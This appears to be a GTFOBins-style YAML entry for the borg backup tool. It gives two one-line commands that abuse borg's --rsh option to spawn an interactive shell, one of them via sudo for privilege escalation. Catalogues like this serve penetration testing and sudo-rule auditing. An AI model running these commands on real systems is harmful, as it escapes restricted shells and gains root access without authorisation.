---
functions:
  shell:
    - code: >
          borg extract @:/:::  --rsh "sh -c 'sh </dev/tty >/dev/tty 2>/dev/tty'"
  sudo:
    - code: >
          sudo borg extract @:/:::  --rsh "sh -c 'sh </dev/tty >/dev/tty 2>/dev/tty'"
---
